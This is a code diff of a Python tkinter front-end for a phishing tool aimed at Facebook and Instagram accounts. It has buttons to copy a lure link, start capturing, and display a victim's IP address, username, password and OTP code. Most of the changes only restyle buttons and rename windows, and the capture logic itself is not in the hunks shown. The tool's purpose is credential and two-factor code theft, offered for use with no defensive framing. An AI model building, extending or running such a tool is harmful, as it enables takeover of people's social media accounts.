@@ -1,6 +1,5 @@
 from tkinter import *
-import os, sys, linecache, time
-from tkinter.ttk import *
+import os
 def sites():
 	def fishinsta():
 		def linkwindow():
@@ -30,10 +29,9 @@ def sites():
 		def ipfinder():
 			j = open("process/ip.txt")
 			ipplace.delete(0, END)
-			ipplace.insert(INSERT, j.read())
-			
+			ipplace.insert(INSERT, j.read())	
 		root4 = Tk()
-		root4.title("link")
+		root4.title("Instagram link")
 		
 		copyplace = Entry(root4, width=60, font="Calibri 10")
 		copyplace.grid(row=0,column=2)
@@ -98,38 +96,36 @@ def sites():
 			j = open("process/ip.txt")
 			ipplace.delete(0, END)
 			ipplace.insert(INSERT, j.read())
+			#ip.config(root3,text="ip2location", command= iplocater)
 		root3 = Tk()
-		root3.title("link")
+		root3.title("Facebook link")
 		
 		copyplace = Entry(root3, width=60, font="Calibri 10")
 		copyplace.grid(row=0,column=2)
 		copyplace.insert(INSERT, "click copy link to get link")
-		copybutton = Button(root3,text="copy link", command= linkwindow)
+		copybutton = Button(root3,text="copy link",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= linkwindow)
 		copybutton.grid(row=0, column=0)
-		
-		sty = Style()
-		sty.configure('W.TButton', font = ('calibri', 10, 'bold'), foreground = 'blue')
-		listener = Button(root3, text="start capturing", style = "W.TButton", command=capture).grid(row=1,column=0)
+		listener = Button(root3, text="start capturing", font=('Times New Roman', 18,'bold'), bg="blue", fg="yellow", state="normal", activebackground="pink", activeforeground="red", cursor="hand2", relief=SUNKEN, command=capture).grid(row=1,column=0)
 	
-		ip = Button(root3,text="ip", command= ipfinder)
+		ip = Button(root3,text="ip",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= ipfinder)
 		ip.grid(row=2, column=0)
 		ipplace= Entry(root3, width=60, font="Calibri 10")
 		ipplace.grid(row=2, column=2)
 		ipplace.insert(INSERT, "click ip to update")
 		
-		username = Button(root3,text="username", command= uname)
+		username = Button(root3,text="username",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= uname)
 		username.grid(row=3, column=0)
 		unameplace= Entry(root3, width=60, font="Calibri 10")
 		unameplace.grid(row=3, column=2)
 		unameplace.insert(INSERT, "click username to update")
 		
-		pw = Button(root3,text="password", command= pwget)
+		pw = Button(root3,text="password",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= pwget)
 		pw.grid(row=4, column=0)
 		pwarea = Entry(root3, width=60, font="Calibri 10")
 		pwarea.grid(row=4,column=2)
 		pwarea.insert(INSERT, "click password to update")
 		
-		otp = Button(root3,text="OTP", command= otpget)
+		otp = Button(root3,text="OTP",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= otpget)
 		otp.grid(row=5, column=0)
 		otparea = Entry(root3, width=60, font="Calibri 10")
 		otparea.grid(row=5,column=2)
@@ -138,9 +134,9 @@ def sites():
 	root1 = Tk()
 	root1.geometry('500x300')
 	root1.title("coose option")
-	option1 = Button(root1, text = 'Facebook',style = 'W.TButton', command = fishfacebook).grid(row = 0, column = 0)
-	option1 = Button(root1, text = 'instagram',style = 'W.TButton', command = fishinsta).grid(row = 0, column = 1)
-	toolcloser = Button(root1, text = 'Quit !', style = 'W.TButton', command = root1.destroy).grid(row = 0, column = 3)
+	option1 = Button(root1, text = 'Facebook',font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command = fishfacebook).grid(row = 0, column = 0)
+	option1 = Button(root1, text = 'instagram',font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN,command = fishinsta).grid(row = 0, column = 1)
+	toolcloser = Button(root1, text = 'Quit !',font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command = root1.destroy).grid(row = 0, column = 3)
 	root1.mainloop()
 os.system("""
 #!/bin/bash
@@ -148,13 +144,11 @@ if [ -f process/new.txt ]; then
 rm process/new.txt
 fi
 	""")
-os.system("""if [ ! -d process ]; then mkdir -p process; fi""")
-root = Tk()
-root.geometry('300x200')
-root.title("fishing tool")
-sty = Style()
-sty.configure('W.TButton', font = ('calibri', 10, 'bold'), foreground = 'red')
-btn1 = Button(root, text = 'Click me !', command =sites,style='W.TButton').grid(row = 0, column = 3, pady = 10, padx = 100)
-sty.configure('W.TButton', font = ('calibri', 10, 'bold'), foreground = 'blue')
-btn2 = Button(root, text = 'Quit !', style = "W.TButton", command = root.destroy).grid(row = 1, column = 3, padx = 100)
+	
+os.system("""if [ ! -d process ]; then mkdir -p process; fi""")	
+root=Tk()
+root.title("practise")
+root.geometry("300x100")
+button1=Button(root, text="Start!", font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command=sites).grid(row=0, column=3)
+button2=Button(root, text="exit", font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command=root.destroy).grid(row=0, column=4)
 root.mainloop()
